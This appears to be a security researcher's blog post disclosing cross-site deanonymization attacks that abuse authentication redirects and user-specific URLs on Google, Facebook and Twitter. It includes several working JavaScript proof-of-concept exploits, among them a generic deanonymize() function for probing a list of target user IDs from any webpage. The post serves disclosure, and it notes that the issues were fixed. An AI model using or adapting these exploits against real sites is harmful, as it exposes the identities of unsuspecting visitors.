---
layout: post
title: Novel Techniques for User Deanonymization Attacks
---
_**TL;DR**: By abusing auth-based redirections and user-specific URIs on modern web applications, an attacker can easily identify and deanonymize any given predefined group of users across the web._

Frankly, this is not really the first time I write about this kind of issues; I first drew attention to this in a thread I initially posted on the [webappsec mailing list](http://www.webappsec.org/lists/websecurity) almost a year ago <a href="#1">[1]</a>, but for some reason, that didn't receive enough attention. Hopefully, the implications I'm going to demonstrate in this writeup would be sufficient for people to start taking the appropriate precautions against this kind of privacy threats out there!

Well, it all started with me logging into my Gmail account as usual, just to notice a redirection being made to a URI specified in a `GET` parameter named "___continue___" with my email address in a second `GET` parameter named "___email___". Here's our interesting endpoint:
{% highlight css linenos %}
https://accounts.google.com/AccountChooser?continue=<URI>&email=<email_address>
{% endhighlight %}
The fun starts when you tamper the value of that "___email___" param, as when you do that, you wouldn't get redirected to the URI specified in the "___continue___" param, but instead, you get redirected to a Gmail re-authentication page! While if you just tamper the value of the "___continue___" param, you still get redirected as long as it's a "[*.google.com](#)" endpoint and the "___email___" param does point to your own email address.

So far, so good. Now, the question is, how could an attacker maliciously exploit such behavior? "Deanonymization" is the word! Here's how:


First, we get the URI of any embeddable resource hosted on "[*.google.com](#)"; a small icon/image would typically do the job. Then we set that "___continue___" param to the URI of that resource, and we set the "___email___" param to the email address of a given target we want to deanonymize (say "`target@gmail.com`"). Like this:
{% highlight css linenos %}
https://accounts.google.com/AccountChooser?continue=https://www.google.com/images/errors/robot.png&email=target@gmail.com
{% endhighlight %}
Now, we have an endpoint that points to an image resource when the email address of the current Gmail user is "`target@gmail.com`" but points to a webpage otherwise! Cool, here's a sweet exploit:
{% highlight javascript linenos %}
(function (email) {
    var endpoint = 'https://accounts.google.com/AccountChooser?continue=https://www.google.com/images/errors/robot.png&email=';
    var img = new Image();
    img.src = endpoint + email;
    window.onload = function () {
        if (img.height === 213 && img.width === 171) {
            alert('Deanonymized successfully!');
        }
    };
    document.documentElement.appendChild(img);
}('target@gmail.com'));
{% endhighlight %}
Note that I had reported this issue to the Google security team, and it has been fixed a long time ago. ...end of story? Not so fast!

They initially pushed a short-term fix by implementing a regex-based blacklist (on top of their permissive whilelist), where they don't generally allow redirections to any endpoint that ends with a file extension such as "`.jpg`", "`.js`", "`.ico`", et al! Which basically means, if you can find an open redirect on "[*.google.com](#)" or even some endpoint that points to an embeddable resource but doesn't end with a file extension, you still have a working exploit! Great, but what if you are just not lucky enough to find something like that? Oh, no worries, the fun never ends:

Well, we know that as long as it's a valid "[*.google.com](#)" endpoint, a redirection shall happen; all we need here is another distinctive behavior that depends on something else other than embeddable resources. What possibly could that be? Oh, HTTP status codes come to the rescue! Here it goes:

What happens if we simply use an endpoint that points to a non-existent resource? Obviously, we get redirected to an error page, and an error page typically returns a "`404 Not Found`" status code. Yet another sweet exploit:
{% highlight javascript linenos %}
(function (email) {
    var endpoint = 'https://accounts.google.com/AccountChooser?continue=https://www.google.com/404&email=';
    var script = document.createElement('script');
    script.src = endpoint + email;
    script.onerror = function () {
        alert('Deanonymized successfully!');
    };
    document.documentElement.appendChild(script);
}('target@gmail.com'));
{% endhighlight %}
Oops! ...works like a charm (as of now, they fixed this by disallowing redirections on `GET` requests altogether) but with one little problem, Google makes use of the "`X-Content-Type-Options: nosniff`" header which tells a browser not to do content type sniffing, disallowing embedding resources that don't return the right MIME type. Luckily, Firefox [doesn't seem to respect that header](https://bugzilla.mozilla.org/show_bug.cgi?id=471020) while working with script elements, but Chrome does respect it! Well, not exactly! It turns out that Chrome doesn't respect it while working with external stylesheets and proceeds to interpret the resource anyway:
<br /><a href="/images/ChConsole.png" target="_blank"><img class="innerImg" src="/images/ChConsole-thumb.png" alt="Chrome console"></a><br />
So, all we have to do is use a link element instead of a script element when running on Chrome. Fair enough, here's one single generic exploit that combines all of these tricks together to deanonymize whoever you want, on whichever browser he uses, against whatever webapp you please:

<div class="code long">
{% highlight javascript linenos %}
/**
 * Deanonymize a predefined group of users, given sufficient arguments.
 * @param attackMethod {string}, the method of the attack (either 'redirection' or 'statusCode').
 * @param endpoint {string}, the vulnerable endpoint with the user ID parameter last.
 * @param idList {array}, a list of the targeted users' IDs.
 * @param callback {function}, a callback function to pass all results to.
 * @return {array}, an ordered output array with boolean values.
 */
function deanonymize(attackMethod, endpoint, idList, callback) {
    var elNodes, testFn;
    var output = [];
    // Register a new cross-browser event listener.
    var addListener = (function () {
        return (window.addEventListener) ? window.addEventListener :
            // For IE8 and earlier versions support.
            function (evName, callback) {
                this.attachEvent('on' + evName, callback);
            };
    }());
    /**
     * Create new DOM elements.
     * @param tagName {string}, elements' tag name.
     * @return {array}, an array of DOM nodes.
     */
    var createElements = function (tagName) {
        var i, l, el;
        var elNodes = [];
        for (i = 0, l = idList.length; i < l; i++) {
            el = document.createElement(tagName);
            if (tagName !== 'link') {
                el.src = endpoint + idList[i];
            } else {
                el.href = endpoint + idList[i];
                el.rel = 'stylesheet';
            }
            if (tagName !== 'img') {
                el.onerror = function () {
                    this.parentElement.removeChild(this);
                };
            }
            elNodes.push(el);
            document.documentElement.appendChild(el);
        }
        return elNodes;
    };
    /**
     * Conduct tests in regard to a given function.
     * @param testFn {function}, a test function.
     * @return void.
     */
    var assess = function (testFn) {
        var i, l;
        for (i = 0, l = elNodes.length; i < l; i++) {
            if (testFn(elNodes[i])) {
                output.push(true);
            } else {
                output.push(false);
            }
        }
        callback(output);
    };
    if (attackMethod === 'redirection') {
        elNodes = createElements('img');
        /**
         * Test if an image node was loaded or not.
         * @param imageNode {object}, a DOM image node.
         * @return {boolean}.
         */
        testFn = function (imgNode) {
            if (imgNode.naturalHeight !== 0 && imgNode.naturalWidth !== 0) {
                return true;
            }
            return false;
        };
    } else if (attackMethod === 'statusCode') {
        elNodes = (/chrome/i.test(navigator.userAgent)) ? createElements('link') :
                           createElements('script');
        /**
         * Test if a given element is a child of `documentElement` or not.
         * @param el {object}, a DOM element.
         * @return {boolean}.
         */
        testFn = function (el) {
            if (el.parentNode !== document.documentElement) {
                return true;
            }
            return false;
        };
    }
    addListener.call(window, 'load', function () { assess(testFn); });
}
{% endhighlight %}
</div>

The story doesn't end here either, these issues are too widespread than you can imagine! I'm talking about Facebook, Twitter and the list goes on! Here's a couple of variations, just to mention a few:

As for Facebook, you could have simply deanonymized a bunch of users based on their profile IDs (using the generic exploit above) by doing something like:
{% highlight javascript linenos %}
deanonymize('statusCode', 'https://www.facebook.com/feed/export/service_redirect.php?service=1&id=', [10001, 10003], alert);
{% endhighlight %}
Now, if any of the users whose profile ID is one of these (10001, 10003) visits our website, he'll get immediately deanonymized! (of course that's fixed now.)

And as for Twitter, you could do it using the ID of any tweet(s) that belongs to your target(s). Like this:
{% highlight javascript linenos %}
deanonymize('statusCode', 'https://twitter.com/intent/retweet?tweet_id=', [10001, 10003], alert);
{% endhighlight %}
But why a tweet ID in particular? That's because I couldn't find any vulnerable user-specific endpoints there! So, alternatively, we exploit the fact that a twitter user cannot retweet his own tweets (also fixed)!

# Conclusion:
The modern web continues to prove itself as a very compromised zone; from timing attacks to nasty techniques like that, your identity and your data are, one way or another, prone to be exposed anytime as you navigate on. Do NOT browse while being authenticated to other web applications (or use <a href="https://www.requestpolicy.com" target="_blank">RequestPolicy</a> if possible). Do NOT allow scripts on untrusted websites (<a href="https://noscript.net">NoScript</a> is always a good idea!).

# References:
<a name="1" style="color: black">[1]: </a><a href="https://lists.w3.org/Archives/Public/public-webappsec/2015May/0043.html" target="_blank">https://lists.w3.org/Archives/Public/public-webappsec/2015May/0043.html</a><br />
[2]: <a href="https://hackerone.com/reports/44814" taget="_blank">https://hackerone.com/reports/44814</a>
